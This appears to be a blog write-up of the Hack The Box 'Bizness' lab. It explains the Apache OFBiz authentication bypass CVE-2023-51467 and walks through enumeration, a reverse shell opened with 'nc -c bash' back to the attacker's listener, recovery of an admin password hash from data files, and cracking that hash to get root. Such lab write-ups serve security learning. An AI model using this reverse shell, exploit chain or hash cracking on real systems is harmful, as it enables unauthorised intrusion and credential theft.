---
title: Hack The Box - Bizness
date: 2024-10-10 13:33:37 +/-TTTT
categories:
  - Hack The Box
tags:
  - HTB
comments: true
image:
  path:
  show_in_post: true
---

HTB Bizness Machine - https://www.hackthebox.com/machines/bizness

### Scanning & Enumeration
Scan the HTB machine with Nmap tool
```
nmap -A -oN initial_scan 10.10.11.252
```

![](Pasted%20image%2020260820151410.png)

Port 80 has redirection to **bizness.htb**, so add it to our `/etc/hosts` file
```
sudo mousepad /etc/hosts
```
`10.10.11.252 bizness.htb`

Lets go and access it

![](019_Bizness_-_Easy_Machine_000.png)

The application is a static web app, with no juicy links or action buttons. Therefore, we will start to do Directory brute forcing using: https://github.com/maurosoria/dirsearch
```
sudo apt-get install dirsearch
python3 dirsearch.py -u https://bizness.htb
```

Output of the Dirsearch tool, as follows:
 `200–11KB - /control/login`
 `200–34KB - /control`
 `200–34KB - /control/`
 `200–21B - /solr/admin/`
 `200–21B - /solr/admin/file/?file=solrconfig.xml`

 So lets navigate to the interesting one here: `/control/login`

![](019_Bizness_-_Easy_Machine_001.png)

And it have a version of Apache OFBiz (v18.12 release).

### Exploitation & Gaining Access
Now we did some research on Apache OFBiz vulnerabilities, we got CVE-2023-51467: https://nvd.nist.gov/vuln/detail/CVE-2023-51467
	The vulnerability permits attackers to circumvent authentication processes, enabling them to remotely execute arbitrary code

And according to: https://threatprotect.qualys.com/2023/12/27/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-51467/ 
	Apache OFBiz is a business application suite that can be used across any industry. The Java-based framework allows developers to quickly expand or improve a typical design to provide new features.

#### Vulnerability Analysis
The vulnerability exists in the login functionality. Apache removed XML RPC code from the application to patch the vulnerability. Analyzing `LoginWorker.java` file helps to understand the flow of data within the various functions and checks during the authentication process.

There arises two possible cases to exploit the vulnerability:
1\. Keeping USERNAME & PASSWORD parameters empty
2\. The USERNAME & PASSWORD parameters are kept empty, however an additional parameter `requirePasswordChange=Y` is added in the URL.

1. Keeping USERNAME & PASSWORD parameters empty
- As the username and password are passed to the `login` function, it return requirePasswordChange (since Username & Password are empty) but requirePasswordChange is set to `Y`
- Now request is sent to `checkLogin` function, which is skipped because the Username & Password (returning false even though parameters were empty).
- The actual reason is due to the `requirePasswordChange` returning false, the function `"error".equals(login(request, response))` also returned false.
Consequently, this leads to the `checkLogin` function returning success, which permits the authentication bypassing.

1. Providing random (invalid) USERNAME & PASSWORD
- The Username & Password were not kept empty and the parameter `requirePasswordChange=Y` is included in the URI.
- The login function returned `requirePasswordChange` due to `requirePasswordChange=Y`. This value is further passed to `checkLogin` function.
- The `"error".equals(login(request, response))` held false due to the return value given by the login function, which was `requirePasswordChange` (like previous case)
Conclusion: The parameter `requirePasswordChange=Y` allows authentication bypass.

- There are many exploits available on Internet for CVE-2023-51467. We are going to use https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
- Analysis of Exploit: This is a Python Script, which is sending request with empty USERNAME and PASSWORD along with `requirePasswordChange` parameter set to `Y`.
- We can supply commands as parameter, which will be executed.

#### Gaining Access
From, terminal 1: Start a listener on our kali machine.
```
nc -lvnp 8081
```

From, terminal 2: Run the exploit, providing the target URL, then our reverse shell with our local IP address.
```
python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.16.42 8081'
```

We will got the shell !

### Privilege Escalation
Searching for the user flag
```
cd /home/ofbiz
ca user.txt
```

#### Upgrade our Shell
We can upgrade our shell by:
```
script /dev/null -qc /bin/bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### Enumerating the Target
Enumerating the target, and listing all files we have in current directory:
```
ofbiz@bizness:/opt/ofbiz\$ ls -la
ofbiz@bizness:/opt/ofbiz\$ cd framework/resources/templates
ofbiz@bizness:/opt/ofbiz/framework/resources/templates\$ ls
```

![](019_Bizness_-_Easy_Machine_002.png)

After a while, I found an interesting file
```
ofbiz@bizness:/opt/ofbiz/framework/resources/templates\$ cat AdminUserLoginData.xml
```

![](019_Bizness_-_Easy_Machine_003.png)

So we got the current password, from the XML file: `{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a`

Continuing our recon, I found another interesting file, called `c54d0.dat`. This file is located in `/opt/ofbiz/runtime/data/derby/ofbiz/seg0`
When I viewed the contents of the file, a hash for the current password was found, which is : `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

![](019_Bizness_-_Easy_Machine_004.png)


This is encrypted Hash with SHA algorithm, therefore we can not reverse the algorithm to get the plain text

If we have access to the original password, we could hash it using the same algorithm and compare it to the stored hash. However, if we don't have the original password, attempting to decrypt the hashed password is not a feasible or ethical approach.

If you are trying to authenticate a user, you should compare the hash of the entered password with the stored hash in the database. If they match, the password is considered correct.

Modern systems often use more advanced techniques, such as salting passwords before hashing, to enhance security.

Found a repo to crack it easily: <https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker>
```
git clone https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker
python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
```

![[Pasted image 20250817005254.png]]
The password is: `monkeybizness`

Switch to the root user
```
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su
Password: monkeybizness

cd /root
cat root.txt
```
